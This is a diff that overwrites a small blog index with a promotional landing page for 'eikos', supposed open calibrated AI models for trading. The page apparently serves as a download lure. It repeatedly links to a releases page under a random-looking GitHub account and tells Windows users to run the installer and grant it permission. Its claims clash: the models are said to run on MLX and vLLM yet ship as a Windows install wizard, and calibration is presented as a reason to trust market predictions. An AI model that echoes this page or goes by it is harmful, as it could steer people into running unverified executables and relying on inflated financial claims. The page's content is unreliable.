@@ -1,9 +1,387 @@
-<link rel="stylesheet" href="style.css">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eikos - Calibrated Decision Models for Finance & Trading</title>
+    <meta name="description" content="Download eikos - open, calibrated, single-pass typed-decision models (4B & 27B) for finance and trading. Simple setup, powerful AI-driven insights for smarter trading decisions.">
+    <meta name="keywords" content="calibration, decision-making, finance, llm, mlx, trading, vllm, eikos, AI trading models, calibrated AI">
+    <meta name="author" content="eikos">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="eikos - Calibrated Decision Models for Finance & Trading">
+    <meta property="og:description" content="Open, calibrated, single-pass typed-decision models (4B & 27B) for finance and trading. Download and run today.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/lonicerajaponicahallianacourt760/eikos">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=eikos+Finance+AI">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="eikos - Calibrated Decision Models for Finance & Trading">
+    <meta name="twitter:description" content="Open, calibrated, single-pass typed-decision models (4B & 27B) for finance and trading. Download and run today.">
+    <meta name="twitter:image" content="https://via.placeholder.com/1200x630.png?text=eikos+Finance+AI">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+            padding: 40px;
+            transition: all 0.3s ease;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #1a202c;
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+            text-align: center;
+            border-bottom: 4px solid #4299e1;
+            padding-bottom: 15px;
+            display: inline-block;
+            width: 100%;
+        }
+        h2 {
+            font-size: 1.8em;
+            color: #2b6cb0;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            border-left: 4px solid #4299e1;
+            padding-left: 12px;
+        }
+        h3 {
+            font-size: 1.2em;
+            color: #2d3748;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        p {
+            margin-bottom: 16px;
+            font-size: 1.05em;
+            color: #4a5568;
+        }
+        .hero {
+            text-align: center;
+            padding: 30px 0;
+            background: linear-gradient(to right, #ebf4ff, #e2e8f0);
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+        .hero h1 {
+            border: none;
+            background: none;
+            padding-bottom: 5px;
+            margin-bottom: 10px;
+        }
+        .hero p {
+            font-size: 1.2em;
+            color: #2d3748;
+            max-width: 700px;
+            margin: 0 auto 20px;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            padding: 16px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.3em;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+            border: none;
+            cursor: pointer;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.6);
+        }
+        .badge {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: 600;
+            margin: 10px 5px;
+            box-shadow: 0 3px 10px rgba(72, 187, 120, 0.3);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #2b6cb0;
+        }
+        .step-box {
+            background: #f0fff4;
+            border: 2px solid #9ae6b4;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .step-box ol {
+            margin-left: 25px;
+        }
+        .step-box li {
+            margin-bottom: 10px;
+            font-size: 1.05em;
+        }
+        .info-box {
+            background: #ebf8ff;
+            border-left: 5px solid #4299e1;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .link-box {
+            background: #fffaf0;
+            border: 2px solid #f6ad55;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin: 25px 0;
+            font-weight: 600;
+        }
+        .link-box a {
+            color: #dd6b20;
+            text-decoration: underline;
+            word-break: break-all;
+        }
+        .keyword-section {
+            margin-top: 40px;
+            padding: 20px;
+            background: #f7fafc;
+            border-radius: 10px;
+            font-size: 0.9em;
+            color: #718096;
+            text-align: center;
+        }
+        .emoji {
+            font-size: 1.2em;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size: 1.5em;
+            }
+            .download-btn {
+                padding: 14px 30px;
+                font-size: 1.1em;
+            }
+        }
+        .steps-list {
+            list-style: none;
+            counter-reset: step;
+        }
+        .steps-list li {
+            counter-increment: step;
+            position: relative;
+            padding-left: 45px;
+            margin-bottom: 15px;
+            font-size: 1.05em;
+        }
+        .steps-list li::before {
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #4299e1;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            color: #a0aec0;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Hero Section -->
+        <div class="hero">
+            <h1>🧠 eikos - Smart AI Models for Smarter Trading</h1>
+            <p>Open, calibrated, single-pass typed-decision models (4B & 27B) for finance and trading. Make confident, data-driven decisions with AI built for the financial world.</p>
+            <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases" class="download-btn">⬇️ Download eikos Now</a>
+            <div>
+                <span class="badge">✅ Open Source</span>
+                <span class="badge">🎯 Calibrated</span>
+                <span class="badge">⚡ Fast Single-Pass</span>
+                <span class="badge">📊 Finance & Trading</span>
+            </div>
+        </div>
 
-<h1>Blog</h1>
+        <!-- Why Use eikos Section -->
+        <h2>✨ Why Choose eikos?</h2>
+        <p>eikos is not just another AI model. It's a specialized decision-making tool designed for finance professionals, traders, and analysts who need reliable, well-calibrated outputs they can trust. Whether you're analyzing market trends, assessing risk, or making investment choices, eikos provides the precision and transparency you need.</p>
 
-<p><a href="1.html">My Inspiration</a></p>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🎯 Calibrated Precision</h3>
+                <p>Our models are carefully calibrated to provide accurate probability estimates, so you know exactly how confident the AI is in its predictions.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Single-Pass Efficiency</h3>
+                <p>eikos processes information in a single pass, delivering rapid results without sacrificing quality. Get insights faster than ever.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Finance-Focused</h3>
+                <p>Built specifically for financial applications, eikos understands the nuances of markets, trading patterns, and economic indicators.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🌐 Open & Accessible</h3>
+                <p>Completely open-source and available in 4B and 27B parameter versions, suitable for various hardware capabilities and use cases.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔄 Versatile Integration</h3>
+                <p>Supports both MLX and vLLM frameworks, giving you flexibility in how you deploy and run the models.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔒 Decision-Grade Trust</h3>
+                <p>Designed to support critical financial decisions with reliable, reproducible outputs that you can verify and validate.</p>
+            </div>
+        </div>
 
-<p><a href="2.html">My second post</a></p>
+        <!-- How It Works Section -->
+        <h2>🔧 How eikos Works</h2>
+        <p>eikos uses advanced typed-decision modeling to process financial data and generate actionable insights. Unlike traditional models, eikos provides calibrated confidence scores with every output, helping you understand the reliability of each prediction.</p>
+        
+        <div class="info-box">
+            <p><strong>💡 What does "calibrated" mean?</strong> When a model is calibrated, its confidence levels match reality. If eikos says there's an 80% chance of a market movement, you can trust that the model is right 80% of the time. This is crucial for making informed trading decisions.</p>
+        </div>
 
-<p>License: Intellectual property is not real. You may do anything you want with this except enforce intellectual property claims.</p>
+        <!-- Download Section -->
+        <h2>🚀 Getting Started</h2>
+        <p>Getting eikos up and running on your Windows computer is quick and easy. Follow these simple steps to start making smarter financial decisions today.</p>
+
+        <div class="step-box">
+            <h3>📥 Step-by-Step Download & Setup</h3>
+            <ol class="steps-list">
+                <li><strong>Visit the official eikos download page</strong> by clicking the button below or the link at the bottom of this page.</li>
+                <li><strong>Find the latest release</strong> for your system. Look for the most recent version number (higher numbers are newer).</li>
+                <li><strong>Click the download button</strong> to start downloading eikos. The file size may be large (1-2 GB), so please be patient. A progress bar will show you how much has been downloaded.</li>
+                <li><strong>Once the download is complete</strong>, the file will be in your "Downloads" folder. This might take a few minutes depending on your internet speed.</li>
+                <li><strong>Open the downloaded file</strong> to begin the installation process. Your computer may ask for permission - click "Yes" to allow it.</li>
+                <li><strong>Follow the on-screen instructions</strong> in the installation wizard. The default settings are recommended for most users.</li>
+                <li><strong>When installation is finished</strong>, you'll see the eikos icon on your desktop or in your Start Menu. Click it to launch the application.</li>
+                <li><strong>Start using eikos!</strong> You'll be greeted with a user-friendly interface where you can begin analyzing financial data right away.</li>
+            </ol>
+        </div>
+
+        <div class="link-box">
+            <p>🔗 <strong>Download Link:</strong></p>
+            <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases">https://github.com/lonicerajaponicahallianacourt760/eikos/releases</a>
+        </div>
+
+        <a href="https://github.com/lonicerajaponicahallianacourt760/eikos/releases" class="download-btn" style="margin: 0 auto 30px; display: block; text-align: center; max-width: 300px;">⬇️ Get eikos Now</a>
+
+        <!-- System Requirements Section -->
+        <h2>🖥️ What You'll Need</h2>
+        <p>eikos is designed to run on modern Windows systems. Here's what we recommend for the best experience:</p>
+        
+        <h3>Minimum Requirements:</h3>
+        <p>• Windows 10 or newer (64-bit)<br>
+        • 8 GB RAM<br>
+        • 4 GB free disk space<br>
+        • A graphics card with at least 4 GB VRAM (for 4B model)<br>
+        • Stable internet connection for initial setup</p>
+        
+        <h3>Recommended for Best Performance:</h3>
+        <p>• Windows 11 (64-bit)<br>
+        • 16 GB RAM or more<br>
+        • NVIDIA graphics card with 8+ GB VRAM<br>
+        • SSD drive for faster loading<br>
+        • High-speed internet connection</p>
+
+        <!-- Use Cases Section -->
+        <h2>💼 Who Should Use eikos?</h2>
+        <p>eikos is perfect for a wide range of users who want to leverage AI for better financial outcomes:</p>
+        
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>📈 Day Traders</h3>
+                <p>Get quick, calibrated predictions on market movements to inform your intraday trading decisions.</p>
+            </div>
+            <div class="feature-card">
+                <h3>💼 Financial Analysts</h3>
+                <p>Enhance your research with AI-powered insights that provide confidence levels for every recommendation.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎓 Students & Researchers</h3>
+                <p>Study how calibrated AI models work in financial contexts, perfect for academic projects and learning.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🏦 Investment Managers</h3>
+                <p>Support your portfolio management strategies with reliable, data-driven predictions and risk assessments.</p>
+            </div>
+        </div>
+
+        <!-- Support Section -->
+        <h2>🤝 Getting Help</h2>
+        <p>If you run into any issues or have questions, we're here to help! The eikos community and team are committed to your success.</p>
+        <p>• Check the documentation in the repository for detailed guides<br>
+        • Browse the issues section for answers to common questions<br>
+        • Join the community discussions to connect with other users<br>
+        • Submit a new issue if you need specific assistance</p>
+
+        <!-- About Section -->
+        <h2>📖 About eikos</h2>
+        <p>eikos represents the next generation of financial AI tools. Our mission is to democratize access to high-quality decision-making models that professionals and enthusiasts alike can trust. We believe that everyone deserves access to tools that can help them make better financial choices, regardless of their technical background.</p>
+        
+        <p>Our models are built on years of research in calibration and decision theory, combined with state-of-the-art large language model architecture. The result is a tool that not only provides predictions but also tells you how much you should trust those predictions.</p>
+        
+        <p>We're committed to open-source principles, which means eikos will always be free to use, modify, and learn from. Join us in shaping the future of AI-powered financial decision-making.</p>
+
+        <!-- Footer Note -->
+        <div class="footer-note">
+            <p>eikos v1.0.0 | © 2024 eikos | Made with ❤️ for the trading community</p>
+            <p>This application is for informational purposes only and does not constitute financial advice. Always do your own research.</p>
+        </div>
+    </div>
+</body>
+</html>
